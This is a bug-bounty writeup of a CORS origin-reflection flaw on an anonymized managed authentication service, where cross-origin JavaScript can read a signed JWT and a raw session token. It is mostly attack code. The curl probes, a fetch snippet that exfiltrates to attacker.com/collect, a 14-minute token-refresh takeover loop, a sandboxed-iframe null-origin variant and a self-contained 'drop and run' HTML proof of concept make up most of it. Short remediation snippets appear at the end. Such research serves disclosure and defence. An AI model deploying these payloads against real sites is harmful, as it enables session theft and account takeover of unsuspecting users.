---
icon: circle-user
cover: ../../.gitbook/assets/sekiro-shadows-die-twice-uhdpaper.com-hd-5.930.jpg
coverY: -102.8042968578816
---

# CORS Wildcard + JWT Theft = Account Takeover on Every target.com Deployment

> **Disclaimer:** Target domain has been anonymized as `sn0x.com` / `sn0xauth` for this writeup. All testing was performed on a staging environment using attacker-controlled test accounts only.&#x20;

***

### TL;DR

Found a CORS misconfiguration on `*.sn0xauth.us-east-2.aws.sn0x.build`  the managed auth service powering every app built on the sn0x.com platform. The server reflects **any** `Origin` header back with `Access-Control-Allow-Credentials: true`. Combined with the fact that the `get-session` endpoint exposes the signed JWT in a response header that cross-origin JS can read (`Access-Control-Expose-Headers: set-auth-jwt`)  this is a full **Account Takeover chain**.&#x20;

One victim page visit → attacker steals your JWT → authenticates to your app backend as you → can loop every 15 minutes for the entire 7-day session lifetime.

**Impact:** Every single user of every single app built on sn0xauth. Attacker needs zero account on the platform.

***

### Background - What Even Is sn0xauth?

So sn0x.com is a serverless Postgres platform. They have this managed auth product let's call it **sn0xauth** where developers can just plug in authentication to their apps without building it themselves. Think of it like a hosted auth backend. When a developer enables it, they get a dedicated endpoint:

```
https://ep-<random-id>.sn0xauth.us-east-2.aws.sn0x.build/<dbname>/auth/
```

This endpoint handles:

* Login / signup
* Session management
* JWT issuance
* Sign-out

Every app built on sn0xauth shares the same underlying infrastructure. Same auth server code. Same CORS configuration. Same bug.

***

### The Recon Phase - How I Even Got Here

I was poking around the platform's API endpoints and noticed that authenticated sessions used JWTs signed with EdDSA (Ed25519). Interesting choice. I started looking at how these JWTs were issued and refreshed.

The `get-session` endpoint caught my eye because:

1. It returns a freshly signed JWT on every call
2. It sets the JWT in a **response header** called `set-auth-jwt`
3. It relies on an httpOnly session cookie for auth

The moment I saw "response header" + "cookie-based auth" my brain went  _wait, what's the CORS config here?_

Because here's the thing if the CORS config is broken AND the JWT is in a readable header AND cookies are sent cross-origin... that's a complete theft chain. Let me check.

***

### Step 1 - The CORS Check (Where It All Started)

First thing I do with any cookie-authenticated endpoint is fire an OPTIONS preflight with a completely random `Origin` and see what comes back.

```bash
┌──(sn0x㉿sn0x)-[~/bb/targets/sn0xauth]
└─$ curl -si "https://ep-royal-frost-w25br9zj.sn0xauth.us-east-2.aws.sn0x.build/sn0xdb/auth/get-session" \
  -X OPTIONS \
  -H "Origin: https://completelyrandom-attacker.xyz" \
  -H "Access-Control-Request-Method: GET"
```

```
HTTP/2 204
access-control-allow-origin: https://completelyrandom-attacker.xyz
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PATCH, PUT, DELETE, OPTIONS
access-control-allow-headers: Content-Type, Authorization, Origin, Accept, User-Agent, X-Requested-With, X-sn0x-Client-Info
access-control-max-age: 86400
```

**Yep. There it is.**

The server just... reflected my origin back. `completelyrandom-attacker.xyz` a domain I made up on the spot got approved. And `Access-Control-Allow-Credentials: true` is sitting right there.

This is the classic CORS origin reflection bug. The server has no allowlist. It takes whatever `Origin` header you send, echoes it back in `Access-Control-Allow-Origin`, and adds credentials true. The browser sees this as "yes, this origin is trusted" and allows cross-origin JS to read the response — including cookies being sent.

#### Why Is This Dangerous?

Normal browser behavior: if Site A makes a fetch request to Site B with `credentials: 'include'`, the browser will only allow Site A's JS to read the response if Site B explicitly says "yes I trust Site A" via CORS headers. This is the **Same-Origin Policy** protection.

When a server does origin reflection, it tells every site in the world "yes I trust you." The browser has no way to know this is wrong  it just follows the headers.

#### Proving Platform-Wide Scope (Not Just One Endpoint)

I wanted to confirm this wasn't just one misconfigured route. So I hammered 5 completely different origins:

```bash
┌──(sn0x㉿sn0x)-[~/bb/targets/sn0xauth]
└─$ SESSION="<VICTIM_SESSION_TOKEN>"
ENDPOINT="https://ep-royal-frost-w25br9zj.sn0xauth.us-east-2.aws.sn0x.build/sn0xdb/auth/get-session"

for origin in \
  "https://evil.com" \
  "https://attacker.io" \
  "https://my-malicious-site.xyz" \
  "http://localhost:1337" \
  "null"; do
  echo -n "Origin: $origin → ACAO: "
  curl -si "$ENDPOINT" \
    -H "Origin: $origin" \
    -H "Cookie: __Secure-sn0xauth.session_token=$SESSION" \
    2>/dev/null | grep "access-control-allow-origin:" | tr -d '\r'
done
```

```
Origin: https://evil.com           → access-control-allow-origin: https://evil.com
Origin: https://attacker.io        → access-control-allow-origin: https://attacker.io
Origin: https://my-malicious-site.xyz → access-control-allow-origin: https://my-malicious-site.xyz
Origin: http://localhost:1337      → access-control-allow-origin: http://localhost:1337
Origin: null                       → access-control-allow-origin: null
```

Every single one. All with `Access-Control-Allow-Credentials: true`. No allowlist. Zero validation. The server is literally just doing:

```javascript
// what the vulnerable server is doing (pseudocode)
response.setHeader('Access-Control-Allow-Origin', request.headers['origin']);
response.setHeader('Access-Control-Allow-Credentials', 'true');
```

Instead of what it should be doing:

```javascript
// what it SHOULD do
const TRUSTED_ORIGINS = ['https://myapp.com', 'https://staging.myapp.com'];
const origin = request.headers['origin'];
if (TRUSTED_ORIGINS.includes(origin)) {
  response.setHeader('Access-Control-Allow-Origin', origin);
  response.setHeader('Access-Control-Allow-Credentials', 'true');
}
// if not trusted — don't set the header at all
```

***

### Step 2 - The JWT Theft (The Real Money Shot)

OK so CORS is broken. Now the question is what can cross-origin JS actually read? Normally even with bad CORS, the damage is limited if sensitive data isn't in the response.

But remember what I noticed earlier  `set-auth-jwt` is in `Access-Control-Expose-Headers`. This is the header that tells the browser "hey, JS is allowed to read these specific response headers cross-origin." The server literally whitelisted the JWT header for cross-origin reading. Combined with the CORS wildcard, this means any website can read the victim's signed JWT.

Let me demonstrate exactly what a cross-origin attacker gets:

```bash
┌──(sn0x㉿sn0x)-[~/bb/targets/sn0xauth]
└─$ curl -si "https://ep-royal-frost-w25br9zj.sn0xauth.us-east-2.aws.sn0x.build/sn0xdb/auth/get-session" \
  -H "Cookie: __Secure-sn0xauth.session_token=<VICTIM_SESSION>" \
  -H "Origin: https://attacker.com"
```

```
HTTP/2 200
access-control-allow-origin: https://attacker.com
access-control-allow-credentials: true
access-control-expose-headers: set-auth-jwt
set-auth-jwt: eyJhbGciOiJFZERTQSIsImtpZCI6ImEzNmI4YmM0...

{
  "session": {
    "expiresAt": "2026-07-04T10:15:57.202Z",
    "token": "vfkJIUKd2HItJR37dFEwN0u3f21sLZ3a",
    "ipAddress": "157.20.184.41",
    "userId": "e4792aa6-f04c-4323-a835-37cc4fcf3e36"
  },
  "user": {
    "name": "CORS Proof Victim",
    "email": "cors-proof-1782555355@sn0x.test",
    "role": "user",
    "id": "e4792aa6-f04c-4323-a835-37cc4fcf3e36"
  }
}
```

What's getting leaked here in one single request:

| Data              | Where                       |
| ----------------- | --------------------------- |
| Signed EdDSA JWT  | `set-auth-jwt` header       |
| Raw session token | `session.token` in body     |
| Email address     | `user.email` in body        |
| User ID           | `user.id` in body           |
| IP address        | `session.ipAddress` in body |
| Session expiry    | `session.expiresAt` in body |

And here's what the JWT actually contains when you decode it:

```bash
┌──(sn0x㉿sn0x)-[~/bb/targets/sn0xauth]
└─$ echo "eyJpYXQiOjE3ODI1NTUzNzcsIm5hbWUiOiJDT1JTIFByb29mIFZpY3RpbSJ9" \
  | python3 -c "
import sys, base64, json
p = sys.stdin.read().strip()
p += '=' * (4 - len(p) % 4)
print(json.dumps(json.loads(base64.urlsafe_b64decode(p)), indent=2))
"
```

```json
{
  "iat": 1782555377,
  "name": "CORS Proof Victim",
  "email": "cors-proof-1782555355@sn0x.test",
  "emailVerified": false,
  "createdAt": "2026-06-27T10:15:57.187Z",
  "role": "authenticated",
  "banned": false,
  "id": "e4792aa6-f04c-4323-a835-37cc4fcf3e36",
  "sub": "e4792aa6-f04c-4323-a835-37cc4fcf3e36",
  "exp": 1782556277,
  "iss": "https://ep-royal-frost-w25br9zj.sn0xauth.us-east-2.aws.sn0x.build",
  "aud": "https://ep-royal-frost-w25br9zj.sn0xauth.us-east-2.aws.sn0x.build"
}
```

Valid. Signed. 15 minutes of lifetime. Contains PII. And a cross-origin attacker just read it.

#### How This Looks From the Attacker's Browser

This is what the malicious page's JS looks like no complicated exploit, just a standard `fetch`:

```javascript
// running on attacker.com — victim just needs to visit this page
const resp = await fetch(
  'https://ep-royal-frost-w25br9zj.sn0xauth.us-east-2.aws.sn0x.build/sn0xdb/auth/get-session',
  {
    credentials: 'include', // browser sends victim's session cookie automatically
    mode: 'cors'
  }
);

// Access-Control-Expose-Headers: set-auth-jwt — browser lets JS read this header
const stolenJWT = resp.headers.get('set-auth-jwt');
// → full signed EdDSA JWT, valid for 15 minutes

const data = await resp.json();
// → victim's email, userId, IP, raw session token — all of it

// exfil to attacker's server
fetch('https://attacker.com/collect', {
  method: 'POST',
  body: JSON.stringify({
    jwt: stolenJWT,
    email: data.user?.email,
    ip: data.session?.ipAddress,
    rawToken: data.session?.token
  })
});
```

The victim visits attacker.com. The page fires this fetch silently in the background. Browser sends the victim's session cookie (because `credentials: 'include'`). Server responds with JWT + PII. Attacker reads it all. Victim has no idea any of this happened.

***

### Step 3 - The ATO Chain (Why This Is Critical, Not Just High)

OK so we have the JWT. Now what? This is where it goes from "data leak" to "account takeover."

Every app backend that uses sn0xauth validates requests via:

```
Authorization: Bearer <jwt>
```

The backend grabs this JWT, verifies the signature against the JWKS endpoint, and if it's valid  treats the request as coming from that user. The backend doesn't know OR care that the JWT was stolen. It's cryptographically valid. Game over.

Let me prove the JWT is actually signed by sn0xauth's key and not something I forged:

```bash
┌──(sn0x㉿sn0x)-[~/bb/targets/sn0xauth]
└─$ curl -s "https://ep-royal-frost-w25br9zj.sn0xauth.us-east-2.aws.sn0x.build/.well-known/jwks.json" | python3 -m json.tool
```

```json
{
  "keys": [
    {
      "alg": "EdDSA",
      "crv": "Ed25519",
      "x": "2zIwW3ZjWBKir-Lz3hofPYMq4hqS8ODadr-9bpLgMDE",
      "kty": "OKP",
      "kid": "a36b8bc4-70fc-4445-a45c-9bbc1bd7c9d6"
    }
  ]
}
```

Now look at the stolen JWT's header:

```json
{
  "alg": "EdDSA",
  "kid": "a36b8bc4-70fc-4445-a45c-9bbc1bd7c9d6"
}
```

`kid` matches perfectly. The stolen JWT was signed by sn0xauth's actual EdDSA private key. Any backend doing standard JWT verification against this JWKS endpoint will accept it as legitimate because it IS legitimate, cryptographically speaking.

#### The Persistent ATO Loop (This Is the Scary Part)

You might think "ok 15 minutes, not that bad." But here's the thing we also stole the raw `session.token` from the response body. This is the underlying session credential. And we can use it to get a fresh JWT anytime we want:

```bash
┌──(sn0x㉿sn0x)-[~/bb/targets/sn0xauth]
└─$ # Call 1
curl -si "$ENDPOINT" \
  -H "Origin: https://attacker.com" \
  -H "Cookie: __Secure-sn0xauth.session_token=$RAW_SESSION_TOKEN" \
  | grep "set-auth-jwt:" | cut -c1-80
```

```
set-auth-jwt: eyJhbGciOiJFZERTQSIs... [iat: 1782555517, exp: 1782556417]
```

```bash
┌──(sn0x㉿sn0x)-[~/bb/targets/sn0xauth]
└─$ sleep 3 && curl -si "$ENDPOINT" \
  -H "Origin: https://attacker.com" \
  -H "Cookie: __Secure-sn0xauth.session_token=$RAW_SESSION_TOKEN" \
  | grep "set-auth-jwt:" | cut -c1-80
```

```
set-auth-jwt: eyJhbGciOiJFZERTQSIs... [iat: 1782555520, exp: 1782556420]
```

`iat` changed  `1782555517` → `1782555520`. That's 3 seconds apart, fresh JWT issued each time. Same session cookie, different `iat`. The server keeps issuing new tokens.

So the attacker's malicious page can run a `setInterval` loop:

```javascript
// persistent ATO loop — runs for the victim's entire session lifetime (7 days)
setInterval(async () => {
  const resp = await fetch(AUTH_URL + '/get-session', { credentials: 'include' });
  const freshJWT = resp.headers.get('set-auth-jwt');
  
  // use freshJWT to call victim's app backend as them
  await fetch('https://victim-app.com/api/sensitive-data', {
    headers: { 'Authorization': `Bearer ${freshJWT}` }
  });
}, 14 * 60 * 1000); // refresh every 14 minutes — before expiry
```

As long as the victim's browser tab is open on attacker.com, this runs indefinitely. Session expires in 7 days. That's 7 days of persistent access to the victim's account.

***

### Step 4 - The Null Origin Bypass (Bonus: Defeats Chrome Protections)

Chrome 119+ introduced **Partitioned cookies**  a mitigation that isolates cookies in cross-site contexts to reduce tracking and CSRF-style attacks. You might think this breaks our attack.

It doesn't. Because of `null` origin.

When you load a page inside a **sandboxed iframe**  specifically `<iframe sandbox="allow-scripts">`  the browser sends `Origin: null` instead of the actual page origin. It's a browser quirk that's been around forever.

Let me confirm the server accepts `null`:

```bash
┌──(sn0x㉿sn0x)-[~/bb/targets/sn0xauth]
└─$ curl -si "https://ep-royal-frost-w25br9zj.sn0xauth.us-east-2.aws.sn0x.build/sn0xdb/auth/get-session" \
  -H "Cookie: __Secure-sn0xauth.session_token=<VICTIM_SESSION>" \
  -H "Origin: null"
```

```
HTTP/2 200
access-control-allow-origin: null
access-control-allow-credentials: true
access-control-expose-headers: set-auth-jwt
set-auth-jwt: eyJhbGciOiJFZERTQSIs... [full signed JWT returned]

{"session":{...full PII...},"user":{...full data...}}
```

Server reflects `null` back, credentials allowed, JWT exposed. Full theft via sandboxed iframe:

```html
<!-- on attacker.com — sandbox bypasses Partitioned cookie isolation -->
<iframe sandbox="allow-scripts" srcdoc="<script>
  fetch('https://ep-royal-frost-w25br9zj.sn0xauth.us-east-2.aws.sn0x.build/sn0xdb/auth/get-session', {
    credentials: 'include'
  }).then(async r => {
    const jwt = r.headers.get('set-auth-jwt');
    const data = await r.json();
    // send stolen data to parent frame
    parent.postMessage({ jwt, email: data.user.email, ip: data.session.ipAddress }, '*');
  });
</script>"></iframe>

<script>
window.addEventListener('message', e => {
  // exfil to attacker server
  fetch('https://attacker.com/collect', {
    method: 'POST',
    body: JSON.stringify(e.data)
  });
});
</script>
```

#### Why `null` Origin Is Particularly Nasty

The `null` origin bypass matters because:

1. Chrome's Partitioned cookies apply to "cross-site" requests detected by origin
2. `null` origin requests from sandboxed iframes are treated differently by the isolation logic
3. The server should explicitly REJECT `null` origin  it should never be trusted
4. Instead the server treats it like any other "valid" origin and reflects it

The fix for this specific case: `if (origin === 'null' || !origin) → reject, don't set ACAO header.`

***

### Step 5 - Self-Contained PoC (Drop and Run)

Full working PoC  host this anywhere, victim visits it while logged into any sn0xauth-powered app:

```html
<!DOCTYPE html>
<!-- cors_jwt_theft_poc.html — host on attacker.com -->
<html>
<body>
<div id="out" style="font-family:monospace;background:#111;color:#0f0;padding:20px;white-space:pre"></div>
<script>
const AUTH = "https://ep-royal-frost-w25br9zj.sn0xauth.us-east-2.aws.sn0x.build/sn0xdb/auth";

async function steal() {
  try {
    const r = await fetch(AUTH + '/get-session', {
      credentials: 'include',
      mode: 'cors'
    });

    const jwt = r.headers.get('set-auth-jwt');
    const data = await r.json();

    const output = [
      `[+] JWT STOLEN: ${jwt?.substring(0, 60)}...`,
      `[+] Email:      ${data.user?.email}`,
      `[+] User ID:    ${data.session?.userId}`,
      `[+] IP Address: ${data.session?.ipAddress}`,
      `[+] Raw Token:  ${data.session?.token}`,
      `[+] Expires:    ${data.session?.expiresAt}`,
    ].join('\n');

    document.getElementById('out').textContent = output;

    // exfil
    await fetch('https://attacker.com/collect', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        jwt,
        email: data.user?.email,
        ip: data.session?.ipAddress,
        userId: data.session?.userId,
        rawToken: data.session?.token
      })
    });

    // persistent ATO loop — refresh JWT every 14 minutes
    setInterval(async () => {
      const r2 = await fetch(AUTH + '/get-session', { credentials: 'include' });
      const freshJWT = r2.headers.get('set-auth-jwt');
      console.log('[*] Fresh JWT:', freshJWT?.substring(0, 40));
      // use freshJWT against victim app backend here
    }, 14 * 60 * 1000);

  } catch(e) {
    document.getElementById('out').textContent = '[-] Failed: ' + e.message;
  }
}

steal();
</script>
</body>
</html>
```

***

### Evidence

| Test                        | Origin Sent                                                | Status   | Result                                        |
| --------------------------- | ---------------------------------------------------------- | -------- | --------------------------------------------- |
| OPTIONS preflight           | `https://completelyrandom-attacker.xyz`                    | 204      | ACAO reflects it  preflight approved          |
| 5-origin table              | evil.com, attacker.io, malicious.xyz, localhost:1337, null | 200 each | All reflected with credentials:true           |
| GET /get-session with creds | `https://attacker.com`                                     | 200      | JWT + email + IP + userId + raw session token |
| Null origin bypass          | `null`                                                     | 200      | Full JWT + PII  defeats Partitioned cookies   |
| JWKS kid match              |                                                            | yup      | `a36b8bc4-...` matches stolen JWT header      |
| Persistent refresh          | same session cookie                                        | 200 x2   | Different `iat` each call  indefinite ATO     |

***

### Why This Happened Root Cause

The sn0xauth server is almost certainly using a CORS middleware configured like this:

```javascript
// vulnerable config — common mistake
app.use(cors({
  origin: true, // ← THIS IS THE BUG. 'true' = reflect any origin
  credentials: true,
  exposedHeaders: ['set-auth-jwt'] // ← makes JWT readable cross-origin
}));
```

`origin: true` in most CORS libraries (like the Node.js `cors` package) means "reflect whatever origin the request sends." It's often used in development for convenience and accidentally shipped to production.

The `exposedHeaders: ['set-auth-jwt']` part makes it significantly worse without this, even with broken CORS the JWT header wouldn't be readable by cross-origin JS. Both misconfigurations together = complete theft chain.

***
